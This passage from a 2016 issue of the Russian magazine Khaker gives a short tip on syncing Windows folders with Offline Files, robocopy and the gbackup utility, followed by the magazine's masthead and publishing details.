нах бывает очень удобно. Для этого есть масса способов — к примеру, фай-
ловые серверы или облачные хранилища вроде Dropbox. Но давай посмотрим,
как можно организовать синхронизацию без всего этого — системными сред-
ствами или при помощи пары миниатюрных утилит.
  В Windows есть такая замечательная вещь, как автономные папки. Суть про-
ста: сетевая папка становится доступна даже при обрыве связи, а после вос-
становления соединения содержимое синхронизируется. Решение неплохое,
но есть недостаток: мы лишены возможности как-либо вмешиваться в процесс
синхронизации. Если, скажем, необходимо синхронизировать только несколь-
ко файлов из разных папок, то проще всего накидать небольшой скриптик с ис-
пользованием Robocopy.
   Robocopy — это утилита командной строки для репликации каталогов.
Она была доступна как часть Windows Resource Kit, а затем стала компонен-
том Windows Vista, Windows 7 и Windows Server 2008. Разработана для отказо-
устойчивого копирования папок или целых деревьев каталогов. Она обладает
возможностью копирования всех (или выбранных) атрибутов и свойств NTFS.
Robocopy к тому же способна легко восстанавливать работу после разрыва се-
тевого соединения.
   Вот простой пример — копирование содержимого каталога C:\A (включая
файлы, атрибуты и метки времени) в каталог C:\B, рекурсивно и вместе с пу-
стыми папками (ключ /E):

robocopy C:\A C:\B /E

Если нужно что-то посложнее, то тебе может пригодиться утилита gbackup.





                                                                       gbackup


Полное описание ты можешь найти на форуме по ссылке выше. Если вкрат-
це, то gbackup — это крошечный (60 Кбайт) аналог платной утилиты nnBackup.
Gbackup умеет создавать обычные и инкрементные архивы, а также синхрони-
зировать папки по расписанию. Работает программа, конечно же, только из ко-
мандной строки и имеет много разных параметров и режимов.
                                    18+





  № 8 (211)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                                Анна Королькова
                                      Верстальщик
                                  цифровой версии


                           РЕКЛАМА
                            Мария Самсоненко
                                Менеджер по рекламе
                                      samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: paywall@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016